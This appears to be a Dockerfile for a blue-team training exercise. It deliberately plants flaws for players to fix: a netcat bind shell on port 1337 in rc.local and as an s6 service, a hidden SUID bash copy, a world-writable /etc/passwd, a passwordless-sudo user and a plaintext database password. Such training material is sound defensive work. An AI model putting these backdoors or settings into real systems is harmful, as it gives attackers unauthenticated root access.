FROM ubuntu:20.04
ARG S6_OVERLAY_VERSION=3.2.0.2

RUN apt-get update && apt-get install -y openssh-server \
    wget curl cron vim nano python sudo netcat-traditional net-tools


#This section is for functionality and useability.

# Install s6
ADD https://github.com/just-containers/s6-overlay/releases/download/v${S6_OVERLAY_VERSION}/s6-overlay-noarch.tar.xz /tmp
RUN tar -C / -Jxpf /tmp/s6-overlay-noarch.tar.xz
ADD https://github.com/just-containers/s6-overlay/releases/download/v${S6_OVERLAY_VERSION}/s6-overlay-x86_64.tar.xz /tmp
RUN tar -C / -Jxpf /tmp/s6-overlay-x86_64.tar.xz

# Create and configure blueteam user
RUN useradd -m -s /bin/bash blueteam && \
    echo "blueteam:blueteam" | chpasswd && \
    mkdir -p /home/blueteam/.ssh && \
    chown blueteam:blueteam /home/blueteam/.ssh
RUN usermod -aG sudo blueteam

# Setup SSH (using vulnerable config)
RUN mkdir /var/run/sshd
COPY ./config/ssh/sshd_config /etc/ssh/sshd_config

# Create the service for sshd
RUN mkdir -p /etc/services.d/sshd && \
    echo '#!/bin/sh\nexec /usr/sbin/sshd -D -f /etc/ssh/sshd_config' > /etc/services.d/sshd/run && \
    chmod +x /etc/services.d/sshd/run

#Everything below will feature flaws that the players will have to correct.

COPY ./config/evil-home-dr/* /home/evil-viking/
RUN useradd -m -s /bin/bash evil-viking && \
    echo "evil-viking:vikings" | chpasswd && \
    mkdir -p /home/evil-viking/.ssh && \
    chown evil-viking:evil-viking /home/evil-viking/.ssh
RUN usermod -aG sudo evil-viking 

RUN echo "evil-viking ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/evil-viking

# Create world-writable system file
RUN chmod 666 /etc/passwd

# Add backdoor port listener
RUN echo "while true; do nc -l -p 1337 -e /bin/bash; done &" >> /etc/rc.local

# Create SUID backdoor
RUN cp /bin/bash /tmp/.hidden-bash && chmod 4777 /tmp/.hidden-bash

# Expose credentials in config file
RUN echo "DB_PASSWORD=Sup3rS3cr3t" > /etc/config.ini && chmod 644 /etc/config.ini

# Create startup script
# Create s6 service for reverse shell
RUN mkdir -p /etc/services.d/reverse-shell && \
    echo '#!/bin/sh \n\
    exec /bin/sh -c "while true; do nc -l -p 1337 -e /bin/bash; done"' \
    > /etc/services.d/reverse-shell/run && \
    chmod +x /etc/services.d/reverse-shell/run


EXPOSE 22

ENTRYPOINT ["/init"]
